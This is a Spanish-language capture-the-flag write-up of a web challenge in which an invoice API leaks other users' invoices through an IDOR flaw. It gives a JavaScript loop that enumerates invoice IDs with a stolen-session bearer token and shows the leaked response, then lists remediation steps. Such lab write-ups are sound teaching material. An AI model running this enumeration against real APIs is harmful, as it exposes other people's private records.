  <!-- meta
  title: Mis Facturas
  os: Web
  difficulty: 200
  vectors: `Web` `IDOR` `API`
  date: 25 Nov 2026
  -->

  # Mis Facturas — Umbral CTF

  - **Categoría:** Web (200 pts)
  - **Objetivo:** `http://167.233.161.66:8003/`
  - **Credenciales iniciales:** `jperez` / `empleado123`

  ---

  ##  FASE DE ENUMERACIÓN

  Al revisar el código fuente de la aplicación web se observa la lógica de consumo de la API en JavaScript:

  1. `POST /api/login` autentica al usuario y almacena un token Bearer en `localStorage`.
  2. `GET /api/facturas` lista las facturas asociadas al usuario autenticado (`jperez` tiene `id: 5` y `id: 6`).
  3. `GET /api/facturas/{id}` consulta el detalle individual de una factura pasando el identificador numérico directamente en la ruta.

  ## FASE DE EXPLOTACIÓN

  Al enumerar secuencialmente los identificadores en `/api/facturas/{id}` utilizando el token de `jperez`, el backend devuelve registros pertenecientes a otros usuarios sin validar propiedad ni permisos:

  ```javascript
  for (let i = 1; i <= 10; i++) {
    fetch('/api/facturas/' + i, {
      headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
    }).then(r => r.json()).then(d => console.log(i, d));
  }
  ```

  Al consultar /api/facturas/1, la API responde con la factura del Gerente General:

  ```json
  {
    "id": 1,
    "cliente": "Carlos Garcia (Gerente General)",
    "monto": "$15.000.000",
    "detalle": "Contrato de consultoria. Ref: <FLAG>"
  }
  ```

  ## FASE DE REMEDIACION Y MITIGACIÓN
  - Verificar en el backend que el usuario asociado al token Bearer sea el propietario de la factura solicitada (o cuente con rol administrativo) antes de devolver GET /api/facturas/{id}.
  - Identificadores no predecibles: Utilizar UUID v4 en lugar de enteros autoincrementales para reducir la enumeración trivial de recursos.